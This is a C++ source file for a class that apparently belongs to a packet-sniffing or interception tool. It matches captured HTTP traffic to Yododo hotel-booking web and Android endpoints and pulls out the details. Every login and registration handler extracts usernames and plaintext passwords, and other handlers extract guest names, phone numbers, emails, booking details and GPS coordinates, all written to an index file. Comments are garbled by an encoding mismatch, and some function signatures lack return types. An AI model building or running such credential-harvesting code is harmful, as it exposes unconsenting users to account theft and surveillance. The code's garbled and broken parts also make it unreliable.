#include "StdAfx.h"
#include "HotelYododo.h"

hotel::HotelYododo::HotelYododo(HttpSession *http_session, const string &pro_name):Hotel(http_session,pro_name)
{
	app_ = "�ζ��";
}

hotel::HotelYododo::~HotelYododo()
{

}

hotel::HotelYododo::IsHotelYododo(HttpSession *http_session)
{
	//web ע��
	if( ( http_session->m_Requestline.m_Host.Find("www.yododo.com") != -1) && 
		( http_session->m_Requestline.m_URI.Find("/user/registerNew.ydd") != -1))	
	{
		return kWebRegister;
	}
	//web��¼
	if( ( http_session->m_Requestline.m_Host.Find("www.yododo.com") != -1) && 
		( http_session->m_Requestline.m_URI.Find("/user/ajaxLogin.ydd") != -1))	
	{
		return kWebLogin;
	}
	//web��ջ��������
	if( ( http_session->m_Requestline.m_Host.Find("www.yododo.cn") != -1) && 
		( http_session->m_Requestline.m_URI.Find("/hotel/ajaxCitySearchTable.ydd") != -1 ))	
	{
		return kWebSearch;
	}
	//web���ھƵ�����
	if( ( http_session->m_Requestline.m_Host.Find("www.yododo.com") != -1) && 
		( http_session->m_Requestline.m_URI.Find("/common/ajaxLoginMessge.jsp") != -1 ))	
	{
		return kWebIntSearch;
	}
	//web���ھƵ�Ԥ��
	if( ( http_session->m_Requestline.m_Host.Find("travel.elong.com") != -1) && 
		( http_session->m_Requestline.m_URI.Find("/hotel/isajax/HotelFillOrder/SaveOrderNew") != -1))	
	{
		return kWebIntNewOrder;
	}
	//web��ջ ��¼
	if( ( http_session->m_Requestline.m_Host.Find("www.yododo.cn") != -1) && 
		( http_session->m_Requestline.m_URI.Find("/user/login.ydd") != -1))	
	{
		return kWebHotelLogin;
	}
	//web��ջ ����
	if( ( http_session->m_Requestline.m_Host.Find("www.yododo.cn") != -1) && 
		( http_session->m_Requestline.m_URI.Find("/hotels/") != -1 ))	
	{
		return kWebHotelSearch;
	}
	//web��ջ Ԥ��
	if( ( http_session->m_Requestline.m_Host.Find("www.yododo.cn") != -1) && 
		( http_session->m_Requestline.m_URI.Find("/sale/addHotelOrder.ydd") != -1))	
	{
		return kWebHotelOrder;
	}
	//androdi��ջ ��¼
	if( ( http_session->m_Requestline.m_Host.Find("api.yododo.com") != -1) && 
		( http_session->m_Requestline.m_URI.Find("/mobile/v2/login.ydd") != -1))	
	{
		return kAndroidLogin;
	}
	//android��ջ ����
	if( ( http_session->m_Requestline.m_Host.Find("appapi.yododo.cn") != -1) && 
		( http_session->m_Requestline.m_URI.Find("/json/search") != -1))	
	{
		return kAndroidSearch;
	}
	//android��ջ ����
	if( ( http_session->m_Requestline.m_Host.Find("appapi.yododo.cn") != -1) && 
		( http_session->m_Requestline.m_URI.Find("/json/hotel/createOrder") != -1))	
	{
		return kAndroidOrder;
	}	
	return 0;
}

hotel::HotelYododo::Process(const char *packet,int action)
{
	//web��¼
	if (action == kWebLogin)
	{
		return WebLogin(packet);
	}
	//webע��
	if (action == kWebRegister)
	{
		return WebRegister(packet);
	}
	//web��������
	if (action == kWebSearch)
	{
		return WebSearch(packet);
	}
	//web���ھƵ�����
	if (action == kWebIntSearch)
	{
		return WebIntSearch(packet);
	}
	//web���ھƵ�Ԥ��
	if (action == kWebIntNewOrder)
	{
		return WebIntNewOrder(packet);
	}
	//web��ջ ��¼
	if (action == kWebHotelLogin)
	{
		return WebHotelLogin(packet);
	}
	//web��ջ ����
	if (action == kWebHotelSearch)
	{
		return WebHotelSearch(packet);
	}
	//web��ջ Ԥ��
	if (action == kWebHotelOrder)
	{
		return WebHotelOrder(packet);
	}
	//android��ջ ��¼
	if (action == kAndroidLogin)
	{
		return AndroidLogin(packet);
	}
	//android��ջ ����
	if (action == kAndroidSearch)
	{
		return AndroidSearch(packet);
	}
	//android��ջ ����
	if (action == kAndroidOrder)
	{
		return AndroidOrder(packet);
	}
	return 0;
}
//webע��
hotel::HotelYododo::WebRegister(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	string username = ms_->GetValueFromMapByKey("user.name",true);
	string password = ms_->GetValueFromMapByKey("user.password",true);
	string phone = ms_->GetValueFromMapByKey("user.info.mobile",true);
	if (username.empty() || password.empty() || phone.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + 		username + "\r\n" +		//�û���
		"pass=" + 		password + "\r\n" + 	//���� 
		"islogin=" +    phone    +  "\r\n" +    //�ֻ�
		"netmark=" +	app_ + "\r\n" + 		//��Դ
		"clientmsg=" +  platformWeb + "\r\n" +  //����ƽ̨
		"state=ע��\r\n";						//״̬
	WriteIndexFile();
	return 1;
}
//web��¼
hotel::HotelYododo::WebLogin(const char *packent)
{
	string src_data(packent);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	string username = ms_->GetValueFromMapByKey("ajaxloginemail",true);
	string password = ms_->GetValueFromMapByKey("ajaxloginpassword",true);
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + 		username + "\r\n" +		//�û���
		"pass=" + 		password + "\r\n" + 	//���� 
		"netmark=" +	app_ + "\r\n" + 		//��Դ
		"clientmsg=" +  platformWeb + "\r\n" +  //����ƽ̨
		"state=��¼\r\n";						//״̬
	WriteIndexFile();
	return 1;
}

//web��ջ ����
hotel::HotelYododo::WebSearch(const char *packet)
{
	string referer = http_session_->m_Requestline.m_Referer.GetBuffer(0);
	//Ŀ�ĵ�
	string cityname = ms_->GetValueBetweenBeginEnd(referer,"/hotels/","?");
	//��ס����
	string livedate = ms_->GetValueBetweenBeginEnd(referer,"starttime","&");
	//�˷�����
	string leavedate = ms_->GetValueBetweenBeginEnd(referer,"endtime","&");
	//�ؼ���
	string keyword = ms_->GetValueBetweenBeginEnd(referer,"name","&");
	if (keyword.empty())
	{
		keyword = "null";
	}
	if (cityname.empty() || livedate.empty() || leavedate.empty())
	{
		return 0;
	}
	output_text_ =
		"servername=" + cityname + "\r\n" + 	//Ŀ�ĵ�
		"appname=" + 	livedate + "\r\n" + 	//��ס����
		"msgtype=" + 	leavedate + "\r\n" +	//�˷�����
		"nick="	 + 	  	keyword + "\r\n" + 		//�ؼ���
		"netmark=" +	app_ + "\r\n" + 		//��Դ
		"clientmsg=" +  platformWeb + "\r\n" +  //����ƽ̨
		"state=��ջ��������\r\n";				//״̬
	WriteIndexFile();
	return 1;
}

//web���ھƵ�����
hotel::HotelYododo::WebIntSearch(const char *packet)
{
	string refer = http_session_->m_Requestline.m_Referer.GetBuffer(0);
	refer = ms_->UTF8ToGBK(UrlDecode(refer));
	ms_->SplitStringToMap(refer,'&','=');
	//��ס����
	string livedate = ms_->GetValueFromMapByKey("starttime");
	//�˷�����
	string leavedate = ms_->GetValueFromMapByKey("endtime");
	//�ؼ���
	string keyword = ms_->GetValueFromMapByKey("likename",true);
	if (keyword.empty())
	{
		keyword = "null";
	}
	if ( livedate.empty() || keyword.empty())
	{
		return 0;
	}
	output_text_ =
		"appname=" + 	livedate + "\r\n" + 	//��ס����
		"msgtype=" + 	leavedate + "\r\n" +	//�˷�����
		"nick="	 + 	  	keyword + "\r\n" + 		//�ؼ���
		"netmark=" +	app_ + "\r\n" + 		//��Դ
		"clientmsg=" +  platformWeb + "\r\n" +  //����ƽ̨
		"state=���ھƵ�����\r\n";				//״̬
	WriteIndexFile();
	return 1;
}

//web���ھƵ�Ԥ��
hotel::HotelYododo::WebIntNewOrder(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//��ס����
	string livedate = ms_->GetValueFromMapByKey("indate");
	//�˷����� 
	string leavedate = ms_->GetValueFromMapByKey("outdate");
	//��������
	string roomcount = ms_->GetValueFromMapByKey("RoomNum");
	//ס������
	string guestname;
	int num = atoi(roomcount.c_str());
	for (int i = 0;i<num; i++)
	{
		char buffer[100]={0};
		sprintf(buffer,"HotelGuestList[%d].Name",i);
		string tmpname(buffer);
		guestname +=ms_->GetValueFromMapByKey(tmpname,true) + ",";
	}
	string::size_type pos;
	pos = guestname.rfind(",");
	guestname = guestname.substr(0,pos);
	//��ϵ�ֻ� 
	string mobile = ms_->GetValueFromMapByKey("HotelContacter.phoneInfo");
	//��ϵ���� 
	string email = ms_->GetValueFromMapByKey("HotelContacter.Email",true);
	//�۸�
	string price = ms_->GetValueFromMapByKey("TotalPrice") + ms_->GetValueFromMapByKey("Currency");
	output_text_ =
		"appname=" +	livedate + "\r\n" + 	//��ס����
		"msgtype=" + 	leavedate + "\r\n" +	//�˷�����
		"subject=" + 	guestname + "\r\n" + 	//ס������
		"islogin=" + 	mobile + "\r\n" + 		//��ϵ�ֻ�
		"oid=" + 	  	email + "\r\n" + 		//��ϵ����
		"mid=" + 	  	price + "\r\n" + 		//�۸�
		"fileurl=" + 	roomcount + "\r\n" + 	//��������
		"netmark=" +	app_ + "\r\n" + 		//��Դ
		"clientmsg=" +  platformWeb + "\r\n" +  //����ƽ̨
		"state=���ھƵ�Ԥ��\r\n";				//״̬
	WriteIndexFile();
	return 1;
}

//web��ջ ��¼
hotel::HotelYododo::WebHotelLogin(const char *packent)
{
	string src_data(packent);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	string username = ms_->GetValueFromMapByKey("user.email",true);
	string password = ms_->GetValueFromMapByKey("user.password",true);
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + 		username + "\r\n" +		//�û���
		"pass=" + 		password + "\r\n" + 	//���� 
		"netmark=" +	app_ + "\r\n" + 		//��Դ
		"clientmsg=" +  platformWeb + "\r\n" +  //����ƽ̨
		"state=��¼\r\n";						//״̬
	WriteIndexFile();
	return 1;
}

//web��ջ ����
hotel::HotelYododo::WebHotelSearch(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	//Ŀ�ĵ�
	string cityname = ms_->GetValueFromMapByKey("placeName",true);
	//��ס����
	string livedate = ms_->GetValueFromMapByKey("starttime");
	//�˷�����
	string leavedate = ms_->GetValueFromMapByKey("endtime");

	if (cityname.empty() || livedate.empty() || leavedate.empty())
	{
		return 0;
	}
	output_text_ =
		"servername=" + cityname + "\r\n" + 	//Ŀ�ĵ�
		"appname=" + 	livedate + "\r\n" + 	//��ס����
		"msgtype=" + 	leavedate + "\r\n" +	//�˷�����
		"netmark=" +	app_ + "\r\n" + 		//��Դ
		"clientmsg=" +  platformWeb + "\r\n" +  //����ƽ̨
		"state=��ջ����\r\n";				    //״̬
	WriteIndexFile();
	return 1;
}

//web��ջ Ԥ��
hotel::HotelYododo::WebHotelOrder(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,'&','=');
	//��ס����
	string livedate = ms_->GetValueFromMapByKey("starttime");
	//�˷����� 
	string leavedate = ms_->GetValueFromMapByKey("endtime");
	//ס������
	string guestname = ms_->GetValueFromMapByKey("realname",true);
	//��ϵ�ֻ� 
	string mobile = ms_->GetValueFromMapByKey("mobile");
	//��������
	string roomcount = ms_->GetValueFromMapByKey("number");
	//��������
	string roomtype = ms_->GetValueFromMapByKey("subject",true);
	if (guestname.empty() || mobile.empty())
	{
		return 0;
	}
	output_text_ =
		"appname=" +	livedate + "\r\n" + 	//��ס����
		"msgtype=" + 	leavedate + "\r\n" +	//�˷�����
		"subject=" + 	guestname + "\r\n" + 	//ס������
		"islogin=" + 	mobile + "\r\n" + 		//��ϵ�ֻ�
		"fileurl=" + 	roomcount + "\r\n" + 	//��������
		"clientmac=" + 	roomtype + "\r\n" + 	//��������
		"netmark=" +	app_ + "\r\n" + 		//��Դ
		"clientmsg=" +  platformWeb + "\r\n" +  //����ƽ̨
		"state=��ջ����Ԥ��\r\n";				//״̬
	WriteIndexFile();
	return 1;
}
//android��ջ ��¼
int hotel::HotelYododo::AndroidLogin(const char *packet)
{
	string url = http_session_->m_Requestline.m_URL.GetBuffer(0);
	ms_->Replace(url,"?","&");
	url = ms_->UrlDecode(url);
    ms_->SplitStringToMap(url,"&","=");
	//�û���
	string username = ms_->GetValueFromMapByKey("loginname",true);
	//����
	string password = ms_->GetValueFromMapByKey("loginpassword");
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + username + "\r\n" +				//�û��� 
		"pass=" + password + "\r\n" + 				//���� 	
		"netmark=" + app_ + "\r\n" + 				//��Դ
		"clientmsg=" + platformAndroid + "\r\n" +	//����ƽ̨
		"state=��¼\r\n";						    //״̬
	WriteIndexFile();
	return 0;
}

//android��ջ ����
int hotel::HotelYododo::AndroidSearch(const char *packet)
{
	string url = http_session_->m_Requestline.m_URI.GetBuffer(0);
	ms_->Replace(url,"?","&");
	url = ms_->UTF8ToGBK(UrlDecode(url));
	ms_->SplitStringToMap(url,'&','=');

	string livedate = ms_->GetValueFromMapByKey("checkin",true);
	string leavedate = ms_->GetValueFromMapByKey("checkout",true);
	string keyword = ms_->GetValueFromMapByKey("hotelName",true);
	string longitude = ms_->GetValueFromMapByKey("longitude",true);
	string latitude = ms_->GetValueFromMapByKey("latitude",true);
	if (keyword.empty())
	{
		keyword = "null";
	}
	if (livedate.empty() || leavedate.empty() || longitude.empty() || latitude.empty())
	{
		return 0;
	}
	output_text_ =
		"appname=" +	livedate + "\r\n" + 		//��ס����
		"msgtype=" + 	leavedate + "\r\n" +		//�˷�����
		"from="    +    longitude +"\r\n"  +		//����
		"to="	   +    latitude   + "\r\n" +		//γ��
		"netmark=" +	app_ + "\r\n" + 		    //��Դ
		"clientmsg=" +  platformAndroid + "\r\n" +  //����ƽ̨
		"state=����\r\n";						    //״̬
	WriteIndexFile();
	return 1;
}
//android��ջ ����
int hotel::HotelYododo::AndroidOrder(const char *packet)
{
	string url = http_session_->m_Requestline.m_URI.GetBuffer(0);
	ms_->Replace(url,"?","&");
	url = ms_->UTF8ToGBK(UrlDecode(url));
	ms_->SplitStringToMap(url,'&','=');
	//��ס����
	string livedate = ms_->GetValueFromMapByKey("checkin");
	//�˷����� 
	string leavedate = ms_->GetValueFromMapByKey("checkout");
	//��������
	string roomcount = ms_->GetValueFromMapByKey("number");
	//ס������
	string guestname = ms_->GetValueFromMapByKey("realname");
	//��ϵ�ֻ� 
	string mobile = ms_->GetValueFromMapByKey("mobile");
    if (guestname.empty() || mobile.empty())
    {
		return 0;
    }
	output_text_ =
		"appname=" +	livedate + "\r\n" + 	//��ס����
		"msgtype=" + 	leavedate + "\r\n" +	//�˷�����
		"subject=" + 	guestname + "\r\n" + 	//ס������
		"islogin=" + 	mobile + "\r\n" + 		//��ϵ�ֻ�
		"fileurl=" + 	roomcount + "\r\n" + 	//��������
		"netmark=" +	app_ + "\r\n" + 		//��Դ
		"clientmsg=" +  platformAndroid + "\r\n" +  //����ƽ̨
		"state=��ջԤ��\r\n";				    //״̬
	WriteIndexFile();
	return 1;
}